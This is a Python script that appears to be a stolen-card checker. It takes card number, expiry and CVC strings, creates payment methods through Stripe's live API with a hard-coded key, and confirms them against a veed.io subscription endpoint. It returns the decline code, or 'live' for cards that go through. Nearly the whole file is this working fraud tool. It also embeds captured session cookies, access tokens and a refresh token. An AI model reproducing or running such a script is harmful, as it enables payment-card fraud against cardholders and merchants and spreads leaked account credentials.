import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=GB&payment_user_agent=stripe.js%2Fa5288ed6e1%3B+stripe-js-v3%2Fa5288ed6e1%3B+payment-element&time_on_page=315751&guid=07e838cc-922f-43ed-a796-e09fdc4fe69f38d32a&muid=ecbcebe0-1cb1-49f1-be5b-37c9ae3b0b3188c491&sid=b84d7a4e-0a0f-4ba9-9a7b-9dda0e2446a42b8c6c&key=pk_live_l1BFAH6I4rWpV6dIqwAZxy3f'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	import requests
	
	cookies = {
	    '__adroll_fpc': '355d520e518a271c1bcc2e9d48c4fd93-1692619308617',
	    '_fbp': 'fb.1.1692619323518.1187977808',
	    '_hjSessionUser_2756785': 'eyJpZCI6IjU2N2FiYTM5LTA4NDctNWYwZi04ZjkyLThjMTE0MWNkNTQxNCIsImNyZWF0ZWQiOjE2OTI2MTkzMjI4MDIsImV4aXN0aW5nIjp0cnVlfQ==',
	    'experiment': '53',
	    'VEED_LOCALE': 'en',
	    'intercom-id-j76wdp4u': 'd2d27dbe-be46-4ad8-99ed-784147c56e3f',
	    'intercom-device-id-j76wdp4u': 'c6879563-ffd6-4228-b86b-442d44474689',
	    '_ga': 'GA1.1.1939150250.1692620055',
	    '_gcl_au': '1.1.208940281.1692622864',
	    'ln_or': 'eyI0MjUxNTEzIjoiZCJ9',
	    'www_veed_io_refresh_token': 'nXlnMBVuzxPkkdkd5QWMDGW145X8uCyq',
	    '__ar_v4': 'QMMGUPELZJEOPNSU2PE7MW%3A20230820%3A6%7CG42K25HGXVANTMCRJERVK6%3A20230820%3A6',
	    'AMP_MKTG_47f1934446': 'JTdCJTdE',
	    '__stripe_mid': 'ecbcebe0-1cb1-49f1-be5b-37c9ae3b0b3188c491',
	    '_hjIncludedInSessionSample_2756785': '0',
	    '_hjSession_2756785': 'eyJpZCI6IjM2MGQ0MjZkLWE3ZjctNDM5OC04MWY5LTg3MTc4M2NhZjVjYyIsImNyZWF0ZWQiOjE2OTI2MzM4NDg5MDMsImluU2FtcGxlIjpmYWxzZX0=',
	    '_hjAbsoluteSessionInProgress': '0',
	    'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Aug+21+2023+19%3A04%3A29+GMT%2B0300+(Eastern+European+Summer+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=149082ab-b9a6-4b0a-8127-0156d4b8bd8c&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0005%3A0&AwaitingReconsent=false',
	    'www_veed_io_user_meta': 'eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0%3D',
	    'user_meta': 'eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0%3D',
	    'www_veed_io_access_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0.YmFvtqR78I2D7JsD8p_sAbySLO1IoZCcE61M3YIDUOayY9T21NYhYAoYHODDQ4dENYmMmoYoqRlCG0lhdW5Z8OK0Nyrk5u6lrRyqUrmpYUWc8wiCgzKC_F6_mGlnlPncNRTvkHe_139Sm8xokBKgFtcYdW5Fw6qHzuWJ1RDuUltYzhcMDg-6nsk4sA1o9nDds5xfDhxnRWkbuEEzj0v4zXqqx0_KnferZgwL3R8V6Ijul_-GMPfrQ4_uVDorzlWrHQojiUceJU3BxargEOyEhkmT6QMfra-Lzzq5N7B8-bkirIaB1rqXV5_9NUSV-5H1s8YnDmhehGjwPjJ-ItHiBlovVxN8Z5phad6PIp9cFqWBiObM7etNBS7vyRkTayxPCnFInnT-jzvO_RYRbnwxxZbp3hjgLSF3V6f2veb18GaelW2B9rrnIfc_i-chtUulsiE84iK0p_8oAM-jpw-8NOn_8uCYIgXvHbu-KXHqgVc_BgB21r6ZeiHlzFCHnLoHPuEetAk9pdt9F9BIZacV0PoXWy6SEWML0x4K9_2T9Jcyh3NdthdIxYFdRIne0LAvjfyFGd49OKBa35dMhGfyvJsI-hnEa4znug_x_-cyScgBjqfN2yLmJEfAOzG7tqqm0pWvBBNdWd_yCEj9oAJsRStEQTwW0wBUCfLcxBgg6ik',
	    'GCLB': 'CIWOuaLD9rOuSg',
	    'ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%225442aaf2-9341-de6e-93c2-b6a9363d7e6d%22%2C%22c%22%3A1692623180455%2C%22l%22%3A1692633879841%7D',
	    'ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%22aeb63472-446c-4b54-9b96-60b40bfd3ae9%22%2C%22c%22%3A1692623180399%2C%22l%22%3A1692633879914%7D',
	    '__stripe_sid': 'b84d7a4e-0a0f-4ba9-9a7b-9dda0e2446a42b8c6c',
	    'ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%22fd3e527a-a9f7-463c-ffd2-c1566c215674%22%2C%22e%22%3A1692635693297%2C%22c%22%3A1692633879731%2C%22l%22%3A1692633893297%7D',
	    '_ga_MDGG251D9T': 'GS1.1.1692633881.3.1.1692633927.0.0.0',
	    'intercom-session-j76wdp4u': 'L2F2ZHlHQjdZU2ZRRzRWVlZBZW42OGRUWGtnYy9IWVVrcVFrNSt6WEdLT1JqUU1SQWpvVE5Tb1hwdFdHalFIVC0tK2NHc0RUQmswZC9tNnd3R0JuZUFKQT09--9aa98d1a4d6c426cdc34ed09bdfd0cc7c5a64ea3',
	    'AMP_47f1934446': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIyOTA1ZDk0ZC01YzI3LTQyMDUtYjkyZi03ZWU4N2UwYWQzZGMlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJhZWI2MzQ3Mi00NDZjLTRiNTQtOWI5Ni02MGI0MGJmZDNhZTklMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNjkyNjMzODc5Mjc0JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTY5MjYzNDE3ODkxMyUyQyUyMmxhc3RFdmVudElkJTIyJTNBNjMlN0Q=',
	}
	
	headers = {
	    'authority': 'www.veed.io',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	    'content-type': 'application/json',
	    # 'cookie': '__adroll_fpc=355d520e518a271c1bcc2e9d48c4fd93-1692619308617; _fbp=fb.1.1692619323518.1187977808; _hjSessionUser_2756785=eyJpZCI6IjU2N2FiYTM5LTA4NDctNWYwZi04ZjkyLThjMTE0MWNkNTQxNCIsImNyZWF0ZWQiOjE2OTI2MTkzMjI4MDIsImV4aXN0aW5nIjp0cnVlfQ==; experiment=53; VEED_LOCALE=en; intercom-id-j76wdp4u=d2d27dbe-be46-4ad8-99ed-784147c56e3f; intercom-device-id-j76wdp4u=c6879563-ffd6-4228-b86b-442d44474689; _ga=GA1.1.1939150250.1692620055; _gcl_au=1.1.208940281.1692622864; ln_or=eyI0MjUxNTEzIjoiZCJ9; www_veed_io_refresh_token=nXlnMBVuzxPkkdkd5QWMDGW145X8uCyq; __ar_v4=QMMGUPELZJEOPNSU2PE7MW%3A20230820%3A6%7CG42K25HGXVANTMCRJERVK6%3A20230820%3A6; AMP_MKTG_47f1934446=JTdCJTdE; __stripe_mid=ecbcebe0-1cb1-49f1-be5b-37c9ae3b0b3188c491; _hjIncludedInSessionSample_2756785=0; _hjSession_2756785=eyJpZCI6IjM2MGQ0MjZkLWE3ZjctNDM5OC04MWY5LTg3MTc4M2NhZjVjYyIsImNyZWF0ZWQiOjE2OTI2MzM4NDg5MDMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Aug+21+2023+19%3A04%3A29+GMT%2B0300+(Eastern+European+Summer+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=149082ab-b9a6-4b0a-8127-0156d4b8bd8c&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0005%3A0&AwaitingReconsent=false; www_veed_io_user_meta=eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0%3D; user_meta=eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0%3D; www_veed_io_access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTI2MzQ3NjQsImlhdCI6MTY5MjYzMzg2NCwic3ViIjoiYWViNjM0NzItNDQ2Yy00YjU0LTliOTYtNjBiNDBiZmQzYWU5Iiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlLCJwcm9qZWN0U2VydmljZUVuYWJsZWQiOmZhbHNlfSwic2NvcGVzIjpbXX0.YmFvtqR78I2D7JsD8p_sAbySLO1IoZCcE61M3YIDUOayY9T21NYhYAoYHODDQ4dENYmMmoYoqRlCG0lhdW5Z8OK0Nyrk5u6lrRyqUrmpYUWc8wiCgzKC_F6_mGlnlPncNRTvkHe_139Sm8xokBKgFtcYdW5Fw6qHzuWJ1RDuUltYzhcMDg-6nsk4sA1o9nDds5xfDhxnRWkbuEEzj0v4zXqqx0_KnferZgwL3R8V6Ijul_-GMPfrQ4_uVDorzlWrHQojiUceJU3BxargEOyEhkmT6QMfra-Lzzq5N7B8-bkirIaB1rqXV5_9NUSV-5H1s8YnDmhehGjwPjJ-ItHiBlovVxN8Z5phad6PIp9cFqWBiObM7etNBS7vyRkTayxPCnFInnT-jzvO_RYRbnwxxZbp3hjgLSF3V6f2veb18GaelW2B9rrnIfc_i-chtUulsiE84iK0p_8oAM-jpw-8NOn_8uCYIgXvHbu-KXHqgVc_BgB21r6ZeiHlzFCHnLoHPuEetAk9pdt9F9BIZacV0PoXWy6SEWML0x4K9_2T9Jcyh3NdthdIxYFdRIne0LAvjfyFGd49OKBa35dMhGfyvJsI-hnEa4znug_x_-cyScgBjqfN2yLmJEfAOzG7tqqm0pWvBBNdWd_yCEj9oAJsRStEQTwW0wBUCfLcxBgg6ik; GCLB=CIWOuaLD9rOuSg; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%225442aaf2-9341-de6e-93c2-b6a9363d7e6d%22%2C%22c%22%3A1692623180455%2C%22l%22%3A1692633879841%7D; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22aeb63472-446c-4b54-9b96-60b40bfd3ae9%22%2C%22c%22%3A1692623180399%2C%22l%22%3A1692633879914%7D; __stripe_sid=b84d7a4e-0a0f-4ba9-9a7b-9dda0e2446a42b8c6c; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22fd3e527a-a9f7-463c-ffd2-c1566c215674%22%2C%22e%22%3A1692635693297%2C%22c%22%3A1692633879731%2C%22l%22%3A1692633893297%7D; _ga_MDGG251D9T=GS1.1.1692633881.3.1.1692633927.0.0.0; intercom-session-j76wdp4u=L2F2ZHlHQjdZU2ZRRzRWVlZBZW42OGRUWGtnYy9IWVVrcVFrNSt6WEdLT1JqUU1SQWpvVE5Tb1hwdFdHalFIVC0tK2NHc0RUQmswZC9tNnd3R0JuZUFKQT09--9aa98d1a4d6c426cdc34ed09bdfd0cc7c5a64ea3; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIyOTA1ZDk0ZC01YzI3LTQyMDUtYjkyZi03ZWU4N2UwYWQzZGMlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJhZWI2MzQ3Mi00NDZjLTRiNTQtOWI5Ni02MGI0MGJmZDNhZTklMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNjkyNjMzODc5Mjc0JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTY5MjYzNDE3ODkxMyUyQyUyMmxhc3RFdmVudElkJTIyJTNBNjMlN0Q=',
	    'origin': 'https://www.veed.io',
	    'referer': 'https://www.veed.io/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'processorPaymentMethodId': id,
	}
	
	response = requests.post(
	    'https://www.veed.io/api/v1/subscriptions/22ac00bd-32de-4969-9ac6-19aec65d8b1f/confirm-payment',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	try:
		ii=(response.json()['errors'][0]['declineCode'])
		return ii
	except:
		return 'live'